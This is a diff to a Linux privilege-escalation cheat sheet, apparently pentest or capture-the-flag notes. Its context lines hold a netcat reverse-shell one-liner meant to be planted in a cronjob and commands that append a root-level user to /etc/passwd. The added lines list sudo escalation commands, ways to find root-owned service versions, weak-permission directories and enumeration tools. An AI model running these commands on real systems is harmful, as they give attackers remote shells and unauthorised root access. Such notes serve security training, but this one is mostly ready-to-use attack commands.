@@ -90,10 +90,10 @@ find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null|column -t
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP><PORT> >/tmp/f" // write this to a file in a cronjob
 ---
 ```
-```
 Injecting a superuser into /etc/passwd
+```
 openssl passwd <newpassword> // Populate password hash
--
+
 echo "<NEW USERNAME>:<HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd // add user to passwd
 - 
 su <new username> // rooted ;)
@@ -116,8 +116,47 @@ int main() {
  }
  
  Compile with gcc -o shellin shellin.c
+ 
+ ```
+Service Exploits
+```
+Find program versions owned by root:
+---------------------
+ps aux | grep root
+<program> --version
+<program> -v
+dpkg -i | grep <program>
+rpm -qa | grep <program>
+---------------------
+Check for services hosted on local network for portforward attack
+--
+netstat -l
+```
+Weak file permissions
+```
+/tmp
+/
+/var/backups
+```
+sudo
+```
+sudo <program>
+sudo -u <user> <program>
+sudo -l 
+
+sudo su 
+sudo -s
+sudo -i
+sudo /bin/bash
+sudo passwd
+```
+Shell Escape Seq
+```
+
 
 ```
+
+ 
 A list of tools
 ```
 RSG - Reverse shell generator, github. (Check it out if you are really stuck)
@@ -127,5 +166,8 @@ LinPeas.sh
 Linuxprivchecker
 BeRoot
 unix-privesc-check
+linux-exploit-suggester (for KE)
 ```
+
+
 
